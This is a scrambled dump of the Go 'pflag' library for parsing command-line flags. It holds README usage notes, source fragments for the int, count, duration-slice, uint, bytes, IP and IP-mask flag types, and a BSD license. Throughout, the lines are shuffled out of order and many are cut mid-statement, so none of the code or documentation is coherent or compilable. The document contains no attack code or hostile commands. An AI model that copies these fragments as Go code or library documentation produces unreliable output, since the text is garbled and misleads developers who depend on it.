"return a, ErrHelp"
return
Type() string
// non-boolean flags
The default set of command-line flags is controlled by
"return fmt.Errorf(""deprecated message for flag %q must be set"", name)"
normalizeNameFunc func(f 
// MarkDeprecated indicated that a flag is deprecated in your program. It will
if len(line) > maxlen {
if flag.Value.Type() != ftype {
func Parse() {
func NArg() int { return len(CommandLine.args) }
"func NewFlagSet(name string, errorHandling ErrorHandling) "
return f
if f.normalizeNameFunc != nil {
 len(s) == 1 {
// after all flags are defined and before flags are accessed by the program.
analogous to the top-level functions for the command-line
// non-boolean and flags without a 'no option default value'
flags can be interspersed with arguments anywhere on the command line
myFlagSet.SetNormalizeFunc(wordSepNormalizeFunc)
 command.
"Most code never instantiates this struct directly, and instead uses"
pointer receivers) and couple them to flag parsing by
 ip=1357         
flags.SortFlags = false
return pflag.NormalizedName(name)
--flag x  // only on flags without a default value
"flags.String(""coolflag"", ""yeaah"", ""it's really cool flag"")"
CommandLine
 Parsed Arguments 
You can see the full reference documentation of the pflag package
 Installation
flag
int.
" when the shorthand ""n"" is used."
"[at godoc.org][3], or through go's standard documentation system by"
// mixed
"flagVal, ""varname"", ""v"", ""help message"")"
"If you like, you can bind the flag to a variable using the Var() functions."
    go get github.com/spf13/pflag
flag set.
": You want -, _, and . in flags to compare the same. aka --my-flag == --my_flag == --my.flag"
In order to support flags defined using Go's 
"import flag ""github.com/spf13/pflag"""
-abc
 More info
"flagvar, ""boolname"", ""b"", true, ""help message"")"
      --usefulflag int    sometimes it's very useful (default 777)
 Deprecating a flag or its shorthand
 Resulting Value 
"      --coolflag string   it's really cool flag (default ""yeaah"")"
"TRUE, FALSE, True, False."
: You want to add the Go flags to the 
There is one exception to this: if you directly instantiate the Flag struct
slice flag.Args() or individually as flag.Arg(i).
flag.Parse()
a flag has a NoOptDefVal and the flag is set on the command line without
[![Go Report Card](https://goreportcard.com/badge/github.com/spf13/pflag)](https://goreportcard.com/report/github.com/spf13/pflag)
"flagVal, ""name"", ""help message for flagname"")"
 Setting no option default values for flags
godoc -http=:6060
"Define flags using flag.String(), Bool(), Int(), etc."
top-level functions.  The FlagSet type allows one to define
or a flag with a default value
"pflag is a drop-in replacement for Go's flag package, implementing"
    flag.IntVar(
"to := ""."""
golang/glog
"independent sets of flags, such as to implement subcommands"
--flag=x
// hide a flag by specifying its name
"Integer flags accept 1234, 0664, 0x1234 and may be negative."
the given flag. Doing this changes the meaning of the flag slightly. If
 -------------    
func aliasNormalizeFunc(f 
 allows you to disable sorting of flags for help and usage message.
 flagset
"goflag ""flag"""
flag.CommandLine.AddGoFlagSet(goflag.CommandLine)
they are all pointers
var ip 
"flags.MarkDeprecated(""badflag"", ""please use --good-flag instead"")"
 flagset. This is usually necessary
"i, err := flagset.GetInt(""flagname"")"
letters for flags. All but the last shorthand letter must be boolean flags
Boolean shorthand flags can be combined with other shorthand flags.
[2]: http://localhost:6060/pkg/github.com/spf13/pflag
After you create a flag it is possible to set the pflag.NoOptDefVal for
different than a double dash. Single dashes signify a series of shorthand
pflag is available using the standard 
pflag is compatible with the [GNU extensions to the POSIX recommendations
an option the flag will be set to the NoOptDefVal. For example given:
"pflag.FlagSet, name string) pflag.NormalizedName {"
Output
func main() {
Example 
break
POSIX/GNU-style --flags.
"int = flag.Int(""flagname"", 1234, ""help message for flagname"")"
": You want to deprecate a flag named ""badflag"" as well as inform the users what flag they should use instead."
"there is one more field ""Shorthand"" that you will need to set."
 Command line flag syntax
// deprecate a flag shorthand by specifying its flag name and a usage message
" if you bind to variables, they're values."
It is possible to set a custom flag name 'normalization function.' It allows flag names to be mutated both when created in the code and when used on the command line to some 'normalized' form. The 'normalized' form is used for comparison. Two examples of using the custom normalization func follow.
func wordSepNormalizeFunc(f 
" package, they must be added to the "
branch=master)](https://travis-ci.org/spf13/pflag)
"--flag    // boolean flags, or flags with no option default values"
"flags.MarkHidden(""secretFlag"")"
import (
 ip=4321         
"functions such as String(), BoolVar(), and Var(), and is therefore"
it was difficult to keep up with all of the flag pointers in your code.
var flagvar bool
"After parsing, the arguments after the flag are available as the"
"flags.MarkShorthandDeprecated(""noshorthandflag"", ""please use --noshorthandflag only"")"
"Flag shorthand -n has been deprecated, please use --noshorthandflag only"
installation.
"Flag parsing stops after the terminator ""--"". Unlike the flag package,"
"Note that usage message is essential here, and it should not be empty."
"name = ""new-flag-name"""
which can be found in the LICENSE file.
Example
"This declares an integer flag, -flagname, stored in the pointer ip, with type "
"Boolean flags (in their long form) accept 1, 0, t, f, true, false,"
"for _, sep := range from {"
pflag is a drop-in replacement of Go's native flag package. If you import
There are helpers function to get values later if you have the FlagSet but
can use GetInt() to get the int value. But notice that 'flagname' must exist
"flags.BoolP(""verbose"", ""v"", false, ""verbose output"")"
"This hides ""badflag"" from help text, and prints "
-n 1234
"The pflag package also defines some new functions that are not in flag,"
 [nothing]        
before this terminator.
 --flagname       
"name = strings.Replace(name, sep, to, -1)"
"pflag is available under the same style of BSD license as the Go language,"
 Hidden flags
"Flag --badflag has been deprecated, please use --good-flag instead"
go get
func init() {
"-absd=""hello"""
[3]: http://godoc.org/github.com/spf13/pflag
"For such flags, the default value is just the initial value of the variable."
-abcs1234
myFlagSet.SetNormalizeFunc(aliasNormalizeFunc)
Run tests by running:
flag.BoolVarP(
"-abcs ""hello"""
to support flags defined by third-party dependencies (e.g. 
 ip=1234         
" when ""badflag"" is used."
running 
"pflag under the name ""flag"" then all code should continue to function"
-f=true
": You want to keep a flag name ""noshorthandflag"" but deprecate its shortname ""n""."
    go test github.com/spf13/pflag
"Unlike the flag package, a single dash before an option means something"
Or you can create custom flags that satisfy the Value interface (with
If you have a pflag.FlagSet with a flag called 'flagname' of type int you
'P' to the name of any function that defines a flag.
: You want to alias two flags. aka --old-flag-name == --new-flag-name
// deprecate a flag by specifying its name and a usage message
in a command-line interface. The methods of FlagSet are
Would result in something like
pflag
[![GoDoc](https://godoc.org/github.com/spf13/pflag
"flag.Lookup(""flagname"").NoOptDefVal = ""4321"""
-n1234
"from := []string{""-"", ""_""}"
"for command-line options][1]. For a more precise description, see the"
 and browsing to
-b true is INVALID
// boolean or flags where the 'no option default value' is set
 -------------   
"Flags may then be used directly. If you're using the flags themselves,"
[![Build Status](https://travis-ci.org/spf13/pflag.svg
"""Command-line flag syntax"" section below."
"After all flags are defined, call"
that give one-letter shorthands for flags. You can use these by appending
flag.VarP(
 Disable sorting of flags
flags.PrintDefaults()
with no changes.
"This hides the shortname ""n"" from help text, and prints "
"It is possible to deprecate a flag, or just its shorthand. Deprecating a flag/shorthand hides it from help text and prints a usage message when the deprecated flag/shorthand is used."
unaffected.
flag.Var(
"flagvar, ""flagname"", 1234, ""help message for flagname"")"
"flag ""github.com/spf13/pflag"""
 Usage
"fmt.Println(""ip has value "", "
[1]: http://www.gnu.org/software/libc/manual/html_node/Argument-Syntax.html
Install by running:
"and it must be an int. GetString(""flagname"") will fail."
-n=1234
"flags.Int(""usefulflag"", 777, ""sometimes it's very useful"")"
Duration flags accept any input valid for time.ParseDuration.
status.svg)](https://godoc.org/github.com/spf13/pflag)
"case ""old-flag-name"":"
 Supporting Go flags when using pflag
"fmt.Println(""flagvar has value "", flagvar)"
"var ip = flag.IntP(""flagname"", ""f"", 1234, ""help message"")"
The arguments are indexed from 0 through flag.NArg()-1.
The default set of command-line flags is controlled by
var flagvar int
": You have a flag named ""secretFlag"" that you need for internal use only and don't want it showing up in help text, or for its usage text to be available."
[http://localhost:6060/pkg/github.com/spf13/pflag][2] after
 --flagname=1357  
"It is possible to mark a flag as hidden, meaning it will still function as normal, however will not show up in usage/help text."
"  -v, --verbose           verbose output"
to parse the command line into the defined flags.
 Description
" Mutating or ""Normalizing"" Flag names"
switch name {
Shorthand letters can be used with single dashes on the command line.
"// IntVar defines an int flag with specified name, default value, and usage string."
type intValue int
"return ""int"""
FlagSet) IntVarP(p 
func IntVar(p 
"// IntP is like Int, but accepts a shorthand letter that can be used after a single dash."
intValue) Set(s string) error {
// The return value is the address of an int variable that stores the value of the flag.
int) 
intValue {
intValue) Type() string {
p := new(int)
i)) }
"FlagSet) Int(name string, value int, usage string) "
"int, name string, value int, usage string) {"
"func IntP(name, shorthand string, value int, usage string) "
p = val
"func intConv(sval string) (interface{}, error) {"
"f.VarP(newIntValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newIntValue(value, p), name, """", usage)"
package pflag
func (i 
"func newIntValue(val int, p "
// -- int Value
"return 0, err"
int {
"f.IntVarP(p, name, shorthand, value, usage)"
i = intValue(v)
// The argument p points to an int variable in which to store the value of the flag.
"return val.(int), nil"
"val, err := f.getFlagType(name, ""int"", intConv)"
"FlagSet) GetInt(name string) (int, error) {"
"return CommandLine.IntP(name, shorthand, value, usage)"
return err
"CommandLine.VarP(newIntValue(value, p), name, shorthand, usage)"
// GetInt return the int value of a flag with the given name
"f.IntVarP(p, name, """", value, usage)"
"return CommandLine.IntP(name, """", value, usage)"
return strconv.Atoi(sval)
"int, name, shorthand string, value int, usage string) {"
intValue)(p)
return (
"// Int defines an int flag with specified name, default value, and usage string."
intValue) String() string { return strconv.Itoa(int(
"import ""strconv"""
if err != nil {
FlagSet) IntVar(p 
"f.VarP(newIntValue(value, p), name, """", usage)"
func IntVarP(p 
return p
"// IntVarP is like IntVar, but accepts a shorthand letter that can be used after a single dash."
"FlagSet) IntP(name, shorthand string, value int, usage string) "
"func Int(name string, value int, usage string) "
"v, err := strconv.ParseInt(s, 0, 64)"
func (f 
FlagSet) DurationSliceVarP(p 
"func durationSliceConv(val string) (interface{}, error) {"
"FlagSet) DurationSliceP(name, shorthand string, value []time.Duration, usage string) "
func DurationSliceVar(p 
"[]time.Duration, name string, value []time.Duration, usage string) {"
var err error
durationSliceValue) String() string {
"out := make([]time.Duration, len(ss))"
return nil
dsv.value = val
"ss := strings.Split(val, "","")"
"return out, nil"
"return CommandLine.DurationSliceP(name, shorthand, value, usage)"
"f.VarP(newDurationSliceValue(value, p), name, shorthand, usage)"
FlagSet) DurationSliceVar(p 
// -- durationSlice Value
" strings.Join(out, "","") "
// The argument p points to a []time.Duration variable in which to store the value of the flag.
"// DurationSliceP is like DurationSlice, but accepts a shorthand letter that can be used after a single dash."
"""strings"""
dsv.value = p
"out[i], err = time.ParseDuration(d)"
// Empty string would cause a slice with one (empty) entry
// The argument p points to a duration[] variable in which to store the value of the flag.
"FlagSet) GetDurationSlice(name string) ([]time.Duration, error) {"
value   
package pflag
"return ""durationSlice"""
"// DurationSliceVarP is like DurationSliceVar, but accepts a shorthand letter that can be used after a single dash."
"func newDurationSliceValue(val []time.Duration, p "
"return val.([]time.Duration), nil"
func DurationSliceVarP(p 
p := []time.Duration{}
dsv := new(durationSliceValue)
"// DurationSlice defines a []time.Duration flag with specified name, default value, and usage string."
"return []time.Duration{}, nil"
return err
} else {
"FlagSet) DurationSlice(name string, value []time.Duration, usage string) "
if len(val) == 0 {
durationSliceValue) Set(val string) error {
if err != nil {
s.changed = true
s.value))
"""fmt"""
import (
type durationSliceValue struct {
"CommandLine.VarP(newDurationSliceValue(value, p), name, """", usage)"
// The return value is the address of a []time.Duration variable that stores the value of the flag.
"for i, d := range ss {"
"// DurationSliceVar defines a duration[] flag with specified name, default value, and usage string."
"val, err := f.getFlagType(name, ""durationSlice"", durationSliceConv)"
[]time.Duration) 
if !s.changed {
"p, name, shorthand, value, usage)"
changed bool
s.value {
[]time.Duration
" ""]"""
"""time"""
"CommandLine.VarP(newDurationSliceValue(value, p), name, shorthand, usage)"
return 
func (f 
"return nil, err"
"p, name, """", value, usage)"
f.DurationSliceVarP(
s.value = out
[]time.Duration {
return dsv
"// DurationSliceVar defines a durationSlice flag with specified name, default value, and usage string."
"out[i] = fmt.Sprintf(""%s"", d)"
durationSliceValue {
"out := make([]string, len("
"return []time.Duration{}, err"
"func DurationSlice(name string, value []time.Duration, usage string) "
"return CommandLine.DurationSliceP(name, """", value, usage)"
"func DurationSliceP(name, shorthand string, value []time.Duration, usage string) "
"f.VarP(newDurationSliceValue(value, p), name, """", usage)"
"for i, d := range "
func (s 
durationSliceValue) Type() string {
"return ""["" "
"val = strings.Trim(val, ""[]"")"
// GetDurationSlice returns the []time.Duration value of a flag with the given name
s.value = append(
"s.value, out...)"
"[]time.Duration, name, shorthand string, value []time.Duration, usage string) {"
countValue)(p)
FlagSet) CountVarP(p 
"FlagSet) Count(name string, usage string) "
"FlagSet) CountP(name, shorthand string, usage string) "
"func CountP(name, shorthand string, usage string) "
"return nil, err"
"FlagSet) GetCount(name string) (int, error) {"
"func Count(name string, usage string) "
// CountVar like CountVar only the flag is placed on the CommandLine instead of a given flag set
// -- count Value
// The return value is the address of an int variable that stores the value of the flag.
int) 
"// """
"// CountVar defines a count flag with specified name, default value, and usage string."
"if s == """
"return i, nil"
type countValue int
p := new(int)
FlagSet) CountVar(p 
i)) }
"// Count defines a count flag with specified name, default value, and usage string."
func CountVar(p 
"v, err := strconv.ParseInt(s, 0, 0)"
p = val
"int, name, shorthand string, usage string) {"
"return CommandLine.CountP(name, """", usage)"
"func newCountValue(val int, p "
package pflag
func (i 
// A count flag will add 1 to its value evey time it is found on the command line
"func countConv(sval string) (interface{}, error) {"
"return 0, err"
return nil
func CountVarP(p 
"1"" {"
int {
// CountP is like Count only takes a shorthand for the flag name.
countValue {
"int, name string, usage string) {"
"CommandLine.CountVarP(p, name, shorthand, usage)"
"f.CountVarP(p, name, """", usage)"
"return ""count"""
i = countValue(
"1"" means that no specific value was passed, so increment"
"return val.(int), nil"
// The argument p points to an int variable in which to store the value of the flag.
"f.CountVarP(p, name, shorthand, usage)"
return err
countValue) Type() string {
"flag := f.VarPF(newCountValue(0, p), name, shorthand, usage)"
"flag.NoOptDefVal = """
"val, err := f.getFlagType(name, ""count"", countConv)"
"CommandLine.CountVar(p, name, usage)"
// CountVarP is like CountVar only take a shorthand for the flag name.
"i, err := strconv.Atoi(sval)"
countValue) Set(s string) error {
i = countValue(v)
return (
"return CommandLine.CountP(name, shorthand, usage)"
"import ""strconv"""
if err != nil {
// GetCount return the int value of a flag with the given name
return p
countValue) String() string { return strconv.Itoa(int(
func (f 
 OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
this software without specific prior written permission.
"LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR"
 Redistributions in binary form must reproduce the above
"DATA, OR PROFITS"
 Neither the name of Google Inc. nor the names of its
"modification, are permitted provided that the following conditions are"
" LOSS OF USE,"
Copyright (c) 2012 Alex Ogier. All rights reserved.
"Redistribution and use in source and binary forms, with or without"
"OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
"""AS IS"" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT"
"OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,"
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
Copyright (c) 2012 The Go Authors. All rights reserved.
A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
"THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT"
"notice, this list of conditions and the following disclaimer."
"copyright notice, this list of conditions and the following disclaimer"
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
"SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT"
"LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES"
in the documentation and/or other materials provided with the
met:
 Redistributions of source code must retain the above copyright
distribution.
contributors may be used to endorse or promote products derived from
type uint32Value uint32
uint32) 
// The return value is the address of a uint32  variable that stores the value of the flag.
"f.Uint32VarP(p, name, """", value, usage)"
"return val.(uint32), nil"
"return CommandLine.Uint32P(name, shorthand, value, usage)"
"uint32, name string, value uint32, usage string) {"
"uint32, name, shorthand string, value uint32, usage string) {"
"func Uint32P(name, shorthand string, value uint32, usage string) "
"CommandLine.VarP(newUint32Value(value, p), name, shorthand, usage)"
// GetUint32 return the uint32 value of a flag with the given name
// -- uint32 value
"FlagSet) Uint32(name string, value uint32, usage string) "
p := new(uint32)
"f.Uint32VarP(p, name, shorthand, value, usage)"
p = val
"FlagSet) GetUint32(name string) (uint32, error) {"
"f.VarP(newUint32Value(value, p), name, """", usage)"
"func uint32Conv(sval string) (interface{}, error) {"
// The argument p points to a uint32 variable in which to store the value of the flag.
"return ""uint32"""
"v, err := strconv.ParseUint(s, 0, 32)"
package pflag
func (i 
FlagSet) Uint32VarP(p 
"return 0, err"
func Uint32VarP(p 
"// Uint32Var defines a uint32 flag with specified name, default value, and usage string."
uint32 {
uint32Value {
"f.VarP(newUint32Value(value, p), name, shorthand, usage)"
"// Uint32 defines a uint32 flag with specified name, default value, and usage string."
// The argument p points to a uint32  variable in which to store the value of the flag.
"// Uint32VarP is like Uint32Var, but accepts a shorthand letter that can be used after a single dash."
"func newUint32Value(val uint32, p "
uint32Value)(p)
uint32Value) Type() string {
return err
FlagSet) Uint32Var(p 
uint32Value) Set(s string) error {
"return uint32(v), nil"
"FlagSet) Uint32P(name, shorthand string, value uint32, usage string) "
"CommandLine.VarP(newUint32Value(value, p), name, """", usage)"
uint32Value) String() string { return strconv.FormatUint(uint64(
"return CommandLine.Uint32P(name, """", value, usage)"
"func Uint32(name string, value uint32, usage string) "
return (
"import ""strconv"""
if err != nil {
i = uint32Value(v)
"// Uint32P is like Uint32, but accepts a shorthand letter that can be used after a single dash."
"val, err := f.getFlagType(name, ""uint32"", uint32Conv)"
"i), 10) }"
return p
"v, err := strconv.ParseUint(sval, 0, 32)"
func Uint32Var(p 
func (f 
"func BytesBase64P(name, shorthand string, value []byte, usage string) "
if err == nil {
"func newBytesHexValue(val []byte, p "
"FlagSet) BytesHexP(name, shorthand string, value []byte, usage string) "
bytesHexValue) Set(value string) error {
"CommandLine.VarP(newBytesHexValue(value, p), name, """", usage)"
"return CommandLine.BytesBase64P(name, """", value, usage)"
"bin, err := hex.DecodeString(strings.TrimSpace(value))"
func BytesHexVarP(p 
bytesBase64Value {
"return CommandLine.BytesBase64P(name, shorthand, value, usage)"
"// BytesBase64Var defines an []byte flag with specified name, default value, and usage string."
return nil
"return CommandLine.BytesHexP(name, """", value, usage)"
"return ""bytesHex"""
"f.VarP(newBytesHexValue(value, p), name, """", usage)"
"// BytesHexVar defines an []byte flag with specified name, default value, and usage string."
bytesHex = bin
"func bytesBase64ValueConv(sval string) (interface{}, error) {"
return (
// The return value is the address of an []byte variable that stores the value of the flag.
"bin, err := hex.DecodeString(sval)"
"FlagSet) BytesBase64P(name, shorthand string, value []byte, usage string) "
"""strings"""
return p
bytesHexValue) Type() string {
"f.BytesHexVarP(p, name, """", value, usage)"
bytesBase64 = bin
"""encoding/base64"""
type bytesBase64Value []byte
"[]byte, name string, value []byte, usage string) {"
"func newBytesBase64Value(val []byte, p "
return base64.StdEncoding.EncodeToString([]byte(bytesBase64))
[]byte {
"val, err := f.getFlagType(name, ""bytesHex"", bytesHexConv)"
FlagSet) BytesHexVar(p 
"func BytesHex(name string, value []byte, usage string) "
"f.BytesHexVarP(p, name, shorthand, value, usage)"
package pflag
"return val.([]byte), nil"
func (bytesBase64 bytesBase64Value) String() string {
"return bin, nil"
"// BytesHex defines an []byte flag with specified name, default value, and usage string."
// Type implements pflag.Value.Type.
"// BytesBase64 defines an []byte flag with specified name, default value, and usage string."
return err
"f.BytesBase64VarP(p, name, """", value, usage)"
if err != nil {
"// BytesHexVarP is like BytesHexVar, but accepts a shorthand letter that can be used after a single dash."
"return nil, fmt.Errorf(""invalid string being converted to Bytes: %s %s"", sval, err)"
"""fmt"""
import (
"FlagSet) GetBytesHex(name string) ([]byte, error) {"
"bin, err := base64.StdEncoding.DecodeString(strings.TrimSpace(value))"
func BytesHexVar(p 
"func bytesHexConv(sval string) (interface{}, error) {"
"f.VarP(newBytesHexValue(value, p), name, shorthand, usage)"
"// BytesBase64P is like BytesBase64, but accepts a shorthand letter that can be used after a single dash."
FlagSet) BytesBase64Var(p 
"// BytesBase64VarP is like BytesBase64Var, but accepts a shorthand letter that can be used after a single dash."
"CommandLine.VarP(newBytesBase64Value(value, p), name, """", usage)"
p := new([]byte)
FlagSet) BytesBase64VarP(p 
p = val
// The argument p points to an []byte variable in which to store the value of the flag.
"func BytesHexP(name, shorthand string, value []byte, usage string) "
func (bytesHex 
bytesHexValue)(p)
bytesBase64Value) Set(value string) error {
"f.VarP(newBytesBase64Value(value, p), name, """", usage)"
"// BytesHexP is like BytesHex, but accepts a shorthand letter that can be used after a single dash."
bytesBase64Value)(p)
// BytesBase64 adapts []byte for use as a flag. Value of flag is Base64 encoded
"val, err := f.getFlagType(name, ""bytesBase64"", bytesBase64ValueConv)"
"""encoding/hex"""
func BytesBase64Var(p 
FlagSet) BytesHexVarP(p 
"[]byte, name, shorthand string, value []byte, usage string) {"
"f.BytesBase64VarP(p, name, shorthand, value, usage)"
// String implements pflag.Value.String.
"func BytesBase64(name string, value []byte, usage string) "
"FlagSet) GetBytesBase64(name string) ([]byte, error) {"
"return []byte{}, err"
// BytesHex adapts []byte for use as a flag. Value of flag is HEX encoded
bytesBase64Value) Type() string {
func (f 
"return CommandLine.BytesHexP(name, shorthand, value, usage)"
"CommandLine.VarP(newBytesHexValue(value, p), name, shorthand, usage)"
// GetBytesHex return the []byte value of a flag with the given name
"return ""bytesBase64"""
func BytesBase64VarP(p 
"return fmt.Sprintf(""%X"", []byte(bytesHex))"
"bin, err := base64.StdEncoding.DecodeString(sval)"
[]byte) 
"CommandLine.VarP(newBytesBase64Value(value, p), name, shorthand, usage)"
"f.VarP(newBytesBase64Value(value, p), name, shorthand, usage)"
// Set implements pflag.Value.Set.
bytesHexValue {
func (bytesBase64 
type bytesHexValue []byte
"FlagSet) BytesBase64(name string, value []byte, usage string) "
"FlagSet) BytesHex(name string, value []byte, usage string) "
func (bytesHex bytesHexValue) String() string {
func (
// GetBytesBase64 return the []byte value of a flag with the given name
.idea/
"// Uint16Var defines a uint flag with specified name, default value, and usage string."
// GetUint16 return the uint16 value of a flag with the given name
"// Uint16P is like Uint16, but accepts a shorthand letter that can be used after a single dash."
"return uint16(v), nil"
FlagSet) Uint16VarP(p 
uint16) 
uint16Value) Set(s string) error {
p := new(uint16)
type uint16Value uint16
"v, err := strconv.ParseUint(sval, 0, 16)"
uint16Value)(p)
// The argument p points to a uint variable in which to store the value of the flag.
p = val
func Uint16Var(p 
"FlagSet) Uint16P(name, shorthand string, value uint16, usage string) "
"func Uint16P(name, shorthand string, value uint16, usage string) "
"FlagSet) Uint16(name string, value uint16, usage string) "
"return ""uint16"""
"FlagSet) GetUint16(name string) (uint16, error) {"
package pflag
func (i 
"return 0, err"
uint16 {
"func Uint16(name string, value uint16, usage string) "
"CommandLine.VarP(newUint16Value(value, p), name, """", usage)"
"val, err := f.getFlagType(name, ""uint16"", uint16Conv)"
"f.Uint16VarP(p, name, shorthand, value, usage)"
"f.VarP(newUint16Value(value, p), name, """", usage)"
"uint16, name string, value uint16, usage string) {"
uint16Value) String() string { return strconv.FormatUint(uint64(
i = uint16Value(v)
return err
"uint16, name, shorthand string, value uint16, usage string) {"
"CommandLine.VarP(newUint16Value(value, p), name, shorthand, usage)"
"f.Uint16VarP(p, name, """", value, usage)"
// -- uint16 value
"func uint16Conv(sval string) (interface{}, error) {"
uint16Value) Type() string {
"func newUint16Value(val uint16, p "
FlagSet) Uint16Var(p 
"return CommandLine.Uint16P(name, """", value, usage)"
"// Uint16VarP is like Uint16Var, but accepts a shorthand letter that can be used after a single dash."
return (
func Uint16VarP(p 
"import ""strconv"""
if err != nil {
"f.VarP(newUint16Value(value, p), name, shorthand, usage)"
uint16Value {
"// Uint16 defines a uint flag with specified name, default value, and usage string."
"i), 10) }"
"v, err := strconv.ParseUint(s, 0, 16)"
"return val.(uint16), nil"
// The return value is the address of a uint  variable that stores the value of the flag.
return p
"return CommandLine.Uint16P(name, shorthand, value, usage)"
// The argument p points to a uint  variable in which to store the value of the flag.
func (f 
"""fmt"""
"return nil, err"
// GetIP return the net.IP value of a flag with the given name
ipValue) Type() string {
import (
"// IPVar defines an net.IP flag with specified name, default value, and usage string."
"func IPP(name, shorthand string, value net.IP, usage string) "
"val, err := f.getFlagType(name, ""ip"", ipConv)"
"net.IP, name, shorthand string, value net.IP, usage string) {"
"CommandLine.VarP(newIPValue(value, p), name, shorthand, usage)"
"return nil, fmt.Errorf(""invalid string being converted to IP address: %s"", sval)"
// The return value is the address of an net.IP variable that stores the value of the flag.
"// IPP is like IP, but accepts a shorthand letter that can be used after a single dash."
"func IP(name string, value net.IP, usage string) "
func IPVar(p 
FlagSet) IPVar(p 
"FlagSet) GetIP(name string) (net.IP, error) {"
ipValue) String() string { return net.IP(
"return fmt.Errorf(""failed to parse IP: %q"", s)"
p = val
"f.IPVarP(p, name, """", value, usage)"
"func newIPValue(val net.IP, p "
"// IPVarP is like IPVar, but accepts a shorthand letter that can be used after a single dash."
"""net"""
package pflag
func (i 
"func ipConv(sval string) (interface{}, error) {"
"return val.(net.IP), nil"
p := new(net.IP)
return nil
ip := net.ParseIP(strings.TrimSpace(s))
i).String() }
type ipValue net.IP
ipValue {
ipValue)(p)
ipValue) Set(s string) error {
func IPVarP(p 
"FlagSet) IPP(name, shorthand string, value net.IP, usage string) "
ip := net.ParseIP(sval)
i = ipValue(ip)
"f.VarP(newIPValue(value, p), name, """", usage)"
FlagSet) IPVarP(p 
// -- net.IP value
if ip == nil {
// The argument p points to an net.IP variable in which to store the value of the flag.
if ip != nil {
net.IP) 
"return ""ip"""
"// IP defines an net.IP flag with specified name, default value, and usage string."
"FlagSet) IP(name string, value net.IP, usage string) "
return (
"f.IPVarP(p, name, shorthand, value, usage)"
"return CommandLine.IPP(name, """", value, usage)"
"net.IP, name string, value net.IP, usage string) {"
"return CommandLine.IPP(name, shorthand, value, usage)"
if err != nil {
"f.VarP(newIPValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newIPValue(value, p), name, """", usage)"
"return ip, nil"
"""strings"""
return p
net.IP {
func (f 
 i < 4
if len(s) != 8 {
ipMaskValue) String() string { return net.IPMask(
"s := fmt.Sprintf(""%d.%d.%d.%d"", m[0], m[1], m[2], m[3])"
// This function should really belong to the net package.
ipMaskValue) Set(s string) error {
"return mask, nil"
return nil
// The argument p points to an net.IPMask variable in which to store the value of the flag.
i).String() }
"return ""ipMask"""
type ipMaskValue net.IPMask
"return net.IPv4Mask(mask[12], mask[13], mask[14], mask[15])"
func ParseIPv4Mask(s string) net.IPMask {
ipMaskValue {
"""strconv"""
"// IPMaskP is like IPMask, but accepts a shorthand letter that can be used after a single dash."
return (
FlagSet) IPMaskVar(p 
return p
// net.IPMask.String() actually outputs things like ffffff00
"CommandLine.VarP(newIPMaskValue(value, p), name, """", usage)"
// ParseIPv4Mask written in IP form (e.g. 255.255.255.0).
"m = append(m, int(d))"
"return val.(net.IPMask), nil"
package pflag
"return nil, fmt.Errorf(""unable to parse %s as net.IPMask"", sval)"
"net.IPMask, name string, value net.IPMask, usage string) {"
i = ipMaskValue(ip)
"func parseIPv4Mask(sval string) (interface{}, error) {"
ipMaskValue) Type() string {
net.IPMask) 
"return CommandLine.IPMaskP(name, shorthand, value, usage)"
p := new(net.IPMask)
 s[2
"func IPMaskP(name, shorthand string, value net.IPMask, usage string) "
ip := ParseIPv4Mask(s)
if err != nil {
"f.IPMaskVarP(p, name, shorthand, value, usage)"
"FlagSet) GetIPv4Mask(name string) (net.IPMask, error) {"
"""fmt"""
import (
mask := ParseIPv4Mask(sval)
"f.VarP(newIPMaskValue(value, p), name, shorthand, usage)"
"val, err := f.getFlagType(name, ""ipMask"", parseIPv4Mask)"
net.IPMask {
"// IPMaskP is like IP, but accepts a shorthand letter that can be used after a single dash."
p = val
// -- net.IPMask value
m := []int{}
// The return value is the address of an net.IPMask variable that stores the value of the flag.
"""net"""
func (i 
"// IPMaskVar defines an net.IPMask flag with specified name, default value, and usage string."
"b := ""0x"" "
for i := 0
func IPMaskVar(p 
"return CommandLine.IPMaskP(name, """", value, usage)"
func IPMaskVarP(p 
"CommandLine.VarP(newIPMaskValue(value, p), name, shorthand, usage)"
func (f 
FlagSet) IPMaskVarP(p 
"return nil, err"
"// IPMaskVarP is like IPMaskVar, but accepts a shorthand letter that can be used after a single dash."
"func newIPMaskValue(val net.IPMask, p "
ipMaskValue)(p)
"f.IPMaskVarP(p, name, """", value, usage)"
// so write a horrible parser for that as well  :-(
mask := net.ParseIP(s)
if mask == nil {
"FlagSet) IPMask(name string, value net.IPMask, usage string) "
"d, err := strconv.ParseInt(b, 0, 0)"
"net.IPMask, name, shorthand string, value net.IPMask, usage string) {"
mask = net.ParseIP(s)
"f.VarP(newIPMaskValue(value, p), name, """", usage)"
"func IPMask(name string, value net.IPMask, usage string) "
if ip == nil {
"return fmt.Errorf(""failed to parse IP mask: %q"", s)"
// GetIPv4Mask return the net.IPv4Mask value of a flag with the given name
"// IPMask defines an net.IPMask flag with specified name, default value, and usage string."
"FlagSet) IPMaskP(name, shorthand string, value net.IPMask, usage string) "
"FlagSet) GetStringSlice(name string) ([]string, error) {"
FlagSet) StringSliceVar(p 
type stringSliceValue struct {
return readAsCSV(sval)
"func newStringSliceValue(val []string, p "
FlagSet) StringSliceVarP(p 
// The return value is the address of a []string variable that stores the value of the flag.
// An empty string would cause a slice with one (empty) string
bytes.Buffer{}
"return []string{}, nil"
sval = sval[1 : len(sval)-1]
return nil
"""bytes"""
csvReader := csv.NewReader(stringReader)
stringSliceValue) Type() string {
stringSliceValue) String() string {
